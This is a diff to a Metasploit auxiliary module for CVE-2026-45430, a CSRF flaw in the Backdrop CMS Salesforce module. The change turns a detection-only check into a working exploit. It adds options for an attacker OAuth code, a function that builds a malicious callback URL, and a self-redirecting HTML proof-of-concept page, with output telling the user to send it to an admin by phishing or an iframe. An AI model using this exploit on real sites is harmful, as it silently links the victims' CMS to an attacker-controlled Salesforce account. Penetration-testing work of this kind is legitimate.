@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name'           => 'Backdrop CMS Salesforce Module OAuth CSRF State Parameter Check',
         'Description'    => %q{
-          This module detects a Cross-Site Request Forgery (CSRF) vulnerability
+          This module detects and exploits a Cross-Site Request Forgery (CSRF) vulnerability
           in the Salesforce module for Backdrop CMS versions before 1.x-1.0.1
           (CVE-2026-45430, CWE-352).
 
@@ -24,8 +24,11 @@ class MetasploitModule < Msf::Auxiliary
           crafted URL, causing their Backdrop CMS installation to be silently
           linked to an attacker-controlled Salesforce account.
 
-          This module only checks for the presence and strength of the state
-          parameter. It does not perform an active CSRF attack.
+          When EXPLOIT is set to true and ATTACKER_CODE is provided, this module
+          generates a CSRF payload URL. When delivered to an authenticated Backdrop
+          administrator (e.g. via phishing), the payload silently links the target
+          CMS to the attacker-controlled Salesforce account by completing the OAuth
+          callback without a valid state check.
 
           Affected versions : Salesforce module < 1.x-1.0.1 for Backdrop CMS
           Fixed in          : Salesforce module 1.x-1.0.1
@@ -54,7 +57,11 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('TARGETURI',     [true,  'Base path to Backdrop CMS installation', '/']),
       OptString.new('OAUTH_PATH',    [false, 'Custom path to Salesforce OAuth authorize endpoint',
                                      '/salesforce/oauth/authorize']),
-      OptInt.new('MIN_STATE_LENGTH', [true,  'Minimum acceptable state parameter entropy (chars)', 16])
+      OptString.new('CALLBACK_PATH', [false, 'Custom path to Salesforce OAuth callback endpoint',
+                                     '/salesforce/oauth/callback']),
+      OptInt.new('MIN_STATE_LENGTH', [true,  'Minimum acceptable state parameter entropy (chars)', 16]),
+      OptBool.new('EXPLOIT',         [false, 'Generate CSRF exploitation payload if target is vulnerable', false]),
+      OptString.new('ATTACKER_CODE', [false, 'Attacker-controlled Salesforce OAuth authorization code for CSRF payload', ''])
     ])
   end
 
@@ -69,7 +76,16 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    check_oauth_state(ip)
+    vulnerable = check_oauth_state(ip)
+
+    if vulnerable && datastore['EXPLOIT']
+      if datastore['ATTACKER_CODE'].to_s.strip.empty?
+        print_warning("#{peer} - EXPLOIT is enabled but ATTACKER_CODE is not set. " \
+                      'Set ATTACKER_CODE to your Salesforce OAuth authorization code.')
+      else
+        generate_csrf_payload(ip)
+      end
+    end
   end
 
   # -----------------------------------------------------------------------
@@ -83,23 +99,27 @@ class MetasploitModule < Msf::Auxiliary
 
     return false unless res
 
-    # Backdrop CMS typically exposes its generator meta tag or
-    # the /core/misc/backdrop.js asset.
-    body = res.body.to_s
+    # Use get_html_document for proper HTML parsing
+    doc     = res.get_html_document
     headers = res.headers.to_s
 
-    backdrop_hints = [
-      /Backdrop CMS/i,
-      /generator.*backdrop/i,
-      /backdrop\.js/i,
-      /sites\/default\/files/i
-    ]
+    # Check meta generator tag via Nokogiri selector
+    generator = doc.at_css('meta[name="generator"]')&.[]('content').to_s
+    return true if generator.match?(/backdrop/i)
 
-    backdrop_hints.any? { |pattern| body.match?(pattern) || headers.match?(pattern) }
+    # Check for Backdrop-specific script sources
+    scripts = doc.css('script[src]').map { |s| s['src'].to_s }
+    return true if scripts.any? { |s| s.match?(/backdrop\.js/i) }
+
+    # Fallback: full-document string checks
+    body_str = doc.to_s
+    body_str.match?(/Backdrop CMS/i) ||
+      body_str.match?(/sites\/default\/files/i) ||
+      headers.match?(/Backdrop CMS/i)
   end
 
   # -----------------------------------------------------------------------
-  # Core vulnerability check
+  # Core vulnerability check -- returns true if target is vulnerable
   # -----------------------------------------------------------------------
   def check_oauth_state(ip)
     oauth_uri = normalize_uri(target_uri.path, datastore['OAUTH_PATH'])
@@ -107,14 +127,14 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{peer} - Requesting OAuth authorize endpoint: #{oauth_uri}")
 
     res = send_request_cgi(
-      'method'        => 'GET',
-      'uri'           => oauth_uri,
-      'allow_redirect'=> false
+      'method'         => 'GET',
+      'uri'            => oauth_uri,
+      'allow_redirect' => false
     )
 
     unless res
       print_error("#{peer} - No response from OAuth endpoint.")
-      return
+      return false
     end
 
     vprint_status("#{peer} - HTTP #{res.code} received")
@@ -123,26 +143,27 @@ class MetasploitModule < Msf::Auxiliary
     when 301, 302, 303, 307, 308
       handle_redirect(ip, res)
     when 200
-      # Some CMS versions embed a redirect inside a meta-refresh or JS snippet
       handle_body_redirect(ip, res)
     when 403, 404
       print_status("#{peer} - OAuth endpoint returned #{res.code}. " \
                    'Salesforce module may not be installed or is restricted.')
+      false
     else
       print_status("#{peer} - Unexpected response code #{res.code}. " \
                    'Cannot determine vulnerability status.')
+      false
     end
   end
 
   # -----------------------------------------------------------------------
-  # Handle HTTP 3xx Location header
+  # Handle HTTP 3xx Location header -- returns true if vulnerable
   # -----------------------------------------------------------------------
   def handle_redirect(ip, res)
     location = res.headers['Location'].to_s.strip
 
     if location.empty?
       print_error("#{peer} - Redirect received but Location header is empty.")
-      return
+      return false
     end
 
     vprint_status("#{peer} - Redirect target: #{location}")
@@ -151,9 +172,11 @@ class MetasploitModule < Msf::Auxiliary
 
   # -----------------------------------------------------------------------
   # Handle redirect embedded in HTML body (meta-refresh / JS)
+  # Returns true if vulnerable
   # -----------------------------------------------------------------------
   def handle_body_redirect(ip, res)
-    body = res.body.to_s
+    doc  = res.get_html_document
+    body = doc.to_s
 
     # meta http-equiv="refresh" content="0;url=..."
     meta_match = body.match(/http-equiv=["']refresh["'][^>]*url=([^\s"'>]+)/i)
@@ -165,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
     if location.nil?
       vprint_status("#{peer} - 200 response but no embedded redirect found. " \
                     'Module may require authentication.')
-      return
+      return false
     end
 
     vprint_status("#{peer} - Embedded redirect target: #{location}")
@@ -174,14 +197,14 @@ class MetasploitModule < Msf::Auxiliary
 
   # -----------------------------------------------------------------------
   # Parse the redirect URL and evaluate the `state` parameter
+  # Returns true if vulnerable, false otherwise
   # -----------------------------------------------------------------------
   def evaluate_state_param(ip, location)
-    # Only care about redirects pointing to Salesforce OAuth
     unless location.include?('salesforce.com') || location.include?('force.com') ||
            location.include?('login.salesforce')
       vprint_status("#{peer} - Redirect does not point to Salesforce. " \
                     'Not an OAuth flow we can evaluate.')
-      return
+      return false
     end
 
     begin
@@ -189,10 +212,10 @@ class MetasploitModule < Msf::Auxiliary
       params = URI.decode_www_form(uri.query.to_s).to_h
     rescue URI::InvalidURIError => e
       print_error("#{peer} - Could not parse redirect URI: #{e.message}")
-      return
+      return false
     end
 
-    state = params['state']
+    state   = params['state']
     min_len = datastore['MIN_STATE_LENGTH'].to_i
 
     if state.nil? || state.strip.empty?
@@ -202,6 +225,7 @@ class MetasploitModule < Msf::Auxiliary
         'VULNERABLE: No `state` parameter present in OAuth redirect. ' \
         'The authorization flow has no CSRF protection.'
       )
+      true
 
     elsif state.length < min_len
       # ---- LIKELY VULNERABLE: state too short / predictable ----
@@ -211,6 +235,7 @@ class MetasploitModule < Msf::Auxiliary
         "(minimum expected: #{min_len}). It may be predictable or static. " \
         "state=#{state}"
       )
+      true
 
     elsif static_state?(state)
       # ---- LIKELY VULNERABLE: state appears non-random ----
@@ -219,6 +244,7 @@ class MetasploitModule < Msf::Auxiliary
         "LIKELY VULNERABLE: `state` parameter appears static or non-random. " \
         "state=#{state}"
       )
+      true
 
     else
       # ---- NOT VULNERABLE ----
@@ -227,7 +253,70 @@ class MetasploitModule < Msf::Auxiliary
         "sufficiently random (#{state.length} chars). " \
         "Patch may already be applied."
       )
+      false
     end
+  end
+
+  # -----------------------------------------------------------------------
+  # Generate CSRF exploitation payload
+  #
+  # Attack flow:
+  #   1. Attacker completes Salesforce OAuth against their own account,
+  #      obtaining a valid authorization `code`.
+  #   2. This module crafts the Backdrop CMS callback URL carrying that code.
+  #   3. The crafted URL is saved as a loot HTML PoC file.
+  #   4. When an authenticated Backdrop admin visits the URL (e.g. via
+  #      phishing or malicious iframe), the CMS silently exchanges the
+  #      attacker's code for a token -- linking the site to the attacker's
+  #      Salesforce account with no CSRF token validation.
+  # -----------------------------------------------------------------------
+  def generate_csrf_payload(ip)
+    attacker_code = Rex::Text.uri_encode(datastore['ATTACKER_CODE'].to_s.strip)
+    callback_path = normalize_uri(target_uri.path, datastore['CALLBACK_PATH'])
+    proto         = datastore['SSL'] ? 'https' : 'http'
+    base_url      = "#{proto}://#{rhost}:#{rport}"
+    csrf_url      = "#{base_url}#{callback_path}?code=#{attacker_code}"
+
+    print_good("#{peer} - CSRF Exploitation Payload:")
+    print_good("#{peer} -   #{csrf_url}")
+    print_good("#{peer} - Deliver this URL to an authenticated Backdrop admin")
+    print_good("#{peer} - (e.g. phishing, malicious iframe, or SSRF).")
+
+    poc_html = build_poc_html(csrf_url)
+    poc_path = store_loot(
+      'csrf.poc',
+      'text/html',
+      ip,
+      poc_html,
+      'backdrop_salesforce_csrf_poc.html',
+      'CVE-2026-45430 CSRF PoC -- delivers attacker OAuth code to Backdrop callback'
+    )
+
+    print_good("#{peer} - CSRF PoC HTML saved to: #{poc_path}")
+  end
+
+  # -----------------------------------------------------------------------
+  # Build a self-submitting HTML PoC page
+  # -----------------------------------------------------------------------
+  def build_poc_html(csrf_url)
+    # HTML attribute context: encode &, ", <, >
+    html_url = csrf_url.gsub('&', '&amp;').gsub('"', '&quot;').gsub('<', '&lt;').gsub('>', '&gt;')
+    # JavaScript string context: only escape \\ and "
+    js_url   = csrf_url.gsub('\\', '\\\\').gsub('"', '\\"')
+    <<~HTML
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="refresh" content="0; url=#{html_url}">
+        <title>CVE-2026-45430 CSRF PoC</title>
+      </head>
+      <body>
+        <p>Loading...</p>
+        <script>window.location.href = "#{js_url}";</script>
+      </body>
+      </html>
+    HTML
   end
 
   # -----------------------------------------------------------------------
